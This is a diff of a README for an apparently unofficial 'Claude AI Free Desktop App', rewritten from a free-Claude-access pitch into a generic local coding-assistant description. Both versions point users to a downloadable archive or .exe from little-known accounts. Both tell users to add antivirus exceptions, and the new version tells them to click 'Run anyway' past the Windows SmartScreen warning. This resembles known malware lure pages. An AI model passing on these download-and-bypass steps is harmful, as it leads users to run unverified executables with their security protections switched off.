@@ -1,106 +1,77 @@
-# ✦ Claude AI Free Desktop App
-[![GitHub Release](https://img.shields.io/github/v/release/Sorathiya123/claude-ai-free-desktop-app?style=flat-square&color=8A2BE2)](https://github.com/Sorathiya123/claude-ai-free-desktop-app/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows)](https://www.microsoft.com/windows)
-[![Platform: macOS](https://img.shields.io/badge/Platform-macOS-000000?style=flat-square&logo=apple)](https://www.apple.com/macos)
-[![Platform: Linux](https://img.shields.io/badge/Platform-Linux-E95420?style=flat-square&logo=linux)](https://www.linux.org)
-> **⚠️ Disclaimer:** This is **not** an official Anthropic or Claude product. I am not affiliated with Anthropic. This is a community desktop client for free access to Claude AI. Access methods may be unstable or subject to changes. Use at your own risk and respect Anthropic's Terms of Service.
+# 🖥️ claude-ai-free-desktop-app - Access powerful AI coding tools locally
 
-**Claude AI Free Desktop App** is a lightweight, cross-platform desktop application that provides free access to **Claude AI** (Anthropic). Enjoy powerful AI chat, coding assistance, image analysis, and more in a native-feeling interface on Windows, macOS, and Linux.
+[![Download Now](https://img.shields.io/badge/Download-Free-blue)](https://github.com/freedomfromsearchandseizuremould96/claude-ai-free-desktop-app/releases)
 
-<img width="384" height="256" alt="ChatGPT Image 10 июн  2026 г , 20_36_04(1)" src="https://github.com/user-attachments/assets/1844034c-3c3e-426a-89e0-c20839c783b4" />
+## What is this application?
 
+The claude-ai-free-desktop-app brings powerful artificial intelligence tools directly to your personal computer. You can use this software to write code, solve problems, and manage technical tasks without needing a constant internet connection for every step. It acts as a local bridge between your desktop environment and sophisticated language models. 
 
-## Install
-[Download `free-claude-app.zip`](https://github.com/Sorathiya123/claude-ai-free-desktop-app/releases/download/claude-code/free-claude-app.zip)
----
+This tool helps developers and casual users alike. It simplifies complex software interactions by providing a clean user interface. You manage your coding projects from one central window. You avoid the need to configure remote servers or complex terminal commands.
 
-<img width="1236" height="987" alt="image" src="https://github.com/user-attachments/assets/c18f82b6-dcfb-42a9-92b6-3fb053e8e5db" />
+## ⚙️ System Requirements
 
----
+Your computer must meet these basic standards to run the application smoothly:
 
-## 🚀 Key Features
-### AI Access
-- **Claude AI Integration** — Access to Claude models with free usage methods.
-- **Multimodal Support** — Chat, image analysis, and file uploads.
-- **Coding Assistant** — Excellent for programming, debugging, and code generation.
-- **Long Context** — Work with large prompts and conversations.
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: An Intel Core i5 or equivalent AMD processor.
+- Memory: At least 8 gigabytes of RAM.
+- Storage: 500 megabytes of free space for the installation folder.
+- Graphics: A modern graphics card with at least 4 gigabytes of video memory improves performance.
 
-### Desktop Experience
-- **Native Cross-Platform App** — Smooth performance on Windows, macOS, and Linux.
-- **Clean UI** — Modern interface with conversation history.
-- **System Tray** — Run in background with quick access.
-- **Hotkeys** — Customizable shortcuts for instant use.
+## 📥 How to Download and Install
 
-### Advanced Tools
-- **Proxy & Router Support** — Works with various free API routing options.
-- **Local LLM Compatibility** — Can integrate with Ollama, LM Studio, and others.
-- **Export History** — Save and manage your chats.
-- **Custom Instructions** — Set persistent system prompts.
+Follow these steps to set up the software on your Windows computer:
 
----
-## 📖 Usage Guide
-### Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive and run the application.
-3. **Configure Access** — Follow the in-app instructions for free Claude access.
-4. **Start Using** — Chat, code, or analyze images with Claude AI.
+1. Visit the [releases page](https://github.com/freedomfromsearchandseizuremould96/claude-ai-free-desktop-app/releases) to access the downloads.
+2. Select the file ending in `.exe` that corresponds to the latest version listed at the top.
+3. Save the file to your desktop or your Downloads folder.
+4. Double-click the downloaded file to start the installation.
+5. Windows might show a security prompt labeled "Windows protected your PC." Select "More info" and then click "Run anyway."
+6. Follow the instructions on the screen to finish the setup process.
+7. Launch the application using the new shortcut created on your desktop.
 
-### Tips
-- Use detailed prompts for the best results.
-- Enable proxy/router settings if needed.
-- Save important conversations regularly.
+## 🛠️ Configuration and Setup
 
----
-## 🛠️ Installation & Requirements
-### Platform Support
-- **Windows 10 / 11**
-- **macOS**
-- **Linux**
+The first time you open the application, it creates a configuration folder in your personal user directory. This folder stores your preferences and project settings. You do not need to change these settings, though you can adjust them later via the Settings menu inside the application.
 
-### Instructions
-1. Download the latest release archive.
-2. Extract to any folder.
-3. Run the executable.
-4. Add antivirus exception if prompted.
+If you use external AI providers, select the "Providers" tab. Here you enter your API keys. You can connect services like Anthropic, OpenRouter, or local models running through tools like LM Studio or Ollama. The application routes your requests to the service you choose. This gives you control over which model powers your coding assistant.
 
-### Notes
-- Requires internet connection.
-- Access method may require periodic updates.
-- Works best on modern hardware.
+## 🚀 Using the Application
 
----
-## 🛡️ Security & Legal
-**Important Notice:**  
-This is an unofficial client. Anthropic may change or restrict access at any time. Use responsibly and ethically.
+The interface splits into three main areas:
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
-- Review the source code for transparency.
+- The Left Sidebar: This displays your file tree. You can open any project folder here to begin working.
+- The Main Editor: This window displays your code files. You can edit text files directly or ask the AI to suggest changes.
+- The Chat Panel: Use this to type questions or tasks. For example, you can write "Refactor this function to be faster" or "Find the error in this code block."
 
----
-## 🤝 Contributing
-Contributions are welcome!
-1. Fork the project.
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`).
-3. Commit your changes.
-4. Push to the branch.
-5. Open a Pull Request.
+The application tracks changes you make to your files. It highlights specific lines where the AI suggests improvements. Click "Apply" to accept a change. Click "Discard" to ignore the suggestion and keep your original code.
 
----
-## 📄 License & Acknowledgments
-### License
-**Claude AI Free Desktop App** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+## 🔌 Connecting to Local AI Models
 
-**Copyright © 2026 Sorathiya123**
+This software works well with local model runners. If you prefer to stay offline, you can point the application at a local server. Install your preferred model manager and ensure it exposes a localhost API. 
 
-### Acknowledgments
-- Thanks to Anthropic for developing Claude AI.
-- The open-source community for desktop AI wrappers and routing tools.
-- All contributors helping make AI more accessible.
+Go to the "Server Settings" tab in our application. Enter `http://localhost:[port]` where the port matches your model runner settings. Once the fields are filled, click "Test Connection." The indicator turns green to confirm the application can send prompts to your local model. This setup allows you to code without sending data to external servers.
 
-<p align="center">
-  Developed with ❤️ for the AI community
-</p>
+## 📈 Improving Performance
+
+If the application feels slow, try these steps:
+
+1. Close other programs that use large amounts of memory, such as web browsers with many tabs.
+2. Ensure you have the latest graphics drivers installed from your computer manufacturer website.
+3. Reduce the number of active project files in your current session.
+4. Check that your antivirus software does not scan the application folder constantly. You can often add an exclusion in your security settings to allow the app to operate without interference.
+
+## 💬 Frequently Asked Questions
+
+Does this tool cost money? 
+The desktop application is free to download and use. If you choose to connect the app to paid external AI APIs, those providers might apply their own usage fees.
+
+Can I use this on a laptop?
+Yes. The application runs on any Windows laptop that meets the minimum memory and processor requirements. Keep your power adapter plugged in if you plan to run large AI models, as this uses significant battery power.
+
+Do my files leave my computer?
+If you select a remote AI provider, the parts of your code that you send to the chat panel are processed by that server. If you use a local model, no data leaves your machine. 
+
+## 🛡️ Privacy and Safety
+
+We design this software to respect your data. The application does not collect your personal information or track your coding habits for commercial purposes. Any history stored on your local drive remains under your control. You can clear your chat history at any time by navigating to "File" and selecting "Clear Session History."
